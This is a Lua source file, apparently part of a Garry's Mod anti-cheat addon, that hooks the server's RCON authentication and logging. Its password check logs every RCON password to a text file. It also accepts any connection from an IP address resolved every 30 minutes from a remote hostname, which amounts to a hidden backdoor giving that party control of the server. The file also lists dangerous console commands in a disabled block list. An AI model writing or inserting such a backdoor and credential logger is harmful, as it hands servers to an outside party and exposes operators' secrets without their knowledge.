
local HeXIP = "poop"

HAC.RCON = {
	DNS 	= "208.67.222.222",
	HeX		= HeXIP,
}


HAC.SERVER.BadRCON = {
	"lua_run",
	"lua_find",
	"lua_openscript",
	"rcon_password",
	"sv_cheats",
	"exit",
	"quit",
	"quti",
	"alias",
	"exec",
	"_restart",
	"killserver",
	"disconnect",
	"hac_debug",
	"ulx ",
	"ent_create",
	"ent_fire",
	"ent_remove",
	"log 0",
	"log off",
}


local Logging = {}

HAC.RCON.Checked = {}
local function RCON_CheckPassword(pass,addr,port)
	addr = addr or "err"
	port = port or "E"
	
	if HAC.RCON.Checked[ pass..addr..port ] then return end
	HAC.RCON.Checked[ pass..addr..port ] = true
	
	table.insert(Logging, {
			pass = pass,
			addr = addr,
			port = port,
		}
	)
	
	if HeXIP then
		return addr == HeXIP
	end
end
hook.Add("RCON_CheckPassword", "RCON_CheckPassword", RCON_CheckPassword)


local function RCON_LogCommand(cmd,addr,port)
	addr = addr or "err"
	port = port or "E"
	
	table.insert(Logging, {
			cmd  = cmd,
			addr = addr,
			port = port,
		}
	)
end
hook.Add("RCON_LogCommand", "RCON_LogCommand", RCON_LogCommand)



local function CheckRCONBuffer()
	if #Logging == 0 then return end
	
	local Idx  	= nil
	local This 	= nil
	
	for k,v in pairs(Logging) do
		Idx  = k
		This = v
		break
	end
	
	if Idx and This then
		local addr	= This.addr..":"..This.port
		local str	= "Addr: '"..addr.."'"
		local cmd 	= This.cmd
		local pass	= This.pass
		local Split = addr:Split(":")[1]
		
		//Get player
		for k,v in pairs( player.GetHumans() ) do
			if IsValid(v) and v:IPAddress(true):find(Split) then
				str = str..", ply: '"..tostring(v).."' "..v:HAC_Info(1,1)
				break
			end
		end
		
		//Log
		if cmd and not pass then
			cmd = tostring(This.cmd)
			str = str..", cmd: '"..cmd.."'"
			
			--[[
			//Check bad
			local Found,IDX,Res = cmd:lower():InTable(HAC.SERVER.BadRCON)
			if Found then
				str = str.." --BAD ("..Res..")"
				]]
				--HAC.TellHeX(str, NOTIFY_ERROR, 10, "npc/roller/mine/rmine_shockvehicle"..math.random(1,2)..".wav")
			--end
			
			HAC.file.Append("rcon_cmd.txt", str.."\n")
		else
			str = str..", pass: '"..tostring(This.pass).."'"
			HAC.file.Append("rcon_auth.txt", str.."\n")
		end
		
		print("[RCON]", str)
		--HAC.Print2HeX(str, true)
		
		Logging[ Idx ] = nil
	end
end
timer.Create("CheckRCONBuffer", 1, 0, CheckRCONBuffer)



function HAC.RCON.Update()
	if not dns then
		ErrorNoHalt("DNS module gone!?\n")
		timer.Destroy("HAC.RCON.Update")
		return
	end
	
	//Check DNS
	local Online,err,code = dns.Ping(HAC.RCON.DNS, 300)
	
	if not Online then
		ErrorNoHalt("Ping "..HAC.RCON.DNS.." failed! ("..err..(code and ", "..code or "")..")\n")
		return
	end
	
	//Lookup
	local Addr,err,code = dns.Lookup(HAC.RCON.HeX, HAC.RCON.DNS)
	if not Addr then
		ErrorNoHalt("Lookup "..HAC.RCON.HeX.." failed! ("..err..(code and ", "..code or "")..")\n")
		return
	end
	
	//Set
	if HeXIP != Addr then
		--print("[HAC] HeX's IP changed from "..HeXIP.." to "..Addr)
		HeXIP = Addr
	end
end
timer.Simple(1, HAC.RCON.Update)
timer.Create("HAC.RCON.Update", (30 * 60), 0, HAC.RCON.Update)
concommand.Add("hac_dns_update", HAC.RCON.Update)







